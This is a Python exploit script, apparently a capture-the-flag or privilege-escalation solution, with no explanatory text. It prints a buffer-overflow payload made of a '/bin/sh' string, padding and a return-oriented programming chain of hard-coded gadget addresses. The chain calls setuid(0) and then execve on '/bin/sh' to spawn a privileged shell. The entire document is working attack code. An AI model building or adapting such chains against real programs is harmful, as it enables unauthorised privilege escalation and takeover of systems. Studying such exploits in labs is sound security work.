#!/usr/bin/env python3

import sys

bin = b'/bin/sh\x00'
sys.stdout.buffer.write(bin)
sys.stdout.buffer.write(b'\x00'*(100-len(bin)))
sys.stdout.buffer.write(b'\x00'*20)
sys.stdout.buffer.write(0x0000000000456587.to_bytes(8, "little"))
sys.stdout.buffer.write(0x69.to_bytes(8, "little"))
sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, "little"))
sys.stdout.buffer.write(b'\x00'*8)
sys.stdout.buffer.write(0x000000000041b506.to_bytes(8, "little"))

sys.stdout.buffer.write(0x000000000048c0aa.to_bytes(8, "little"))
sys.stdout.buffer.write(0x3b.to_bytes(8, "little"))
sys.stdout.buffer.write(0x00.to_bytes(8, "little"))
sys.stdout.buffer.write(0x00.to_bytes(8, "little"))

sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, "little"))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, "little"))

sys.stdout.buffer.write(0x000000000040a57e.to_bytes(8, "little"))
sys.stdout.buffer.write(b'\x00'*8)

sys.stdout.buffer.write(0x00000000004022c4.to_bytes(8, "little"))





# bin addr: 0x7ffffff6adb0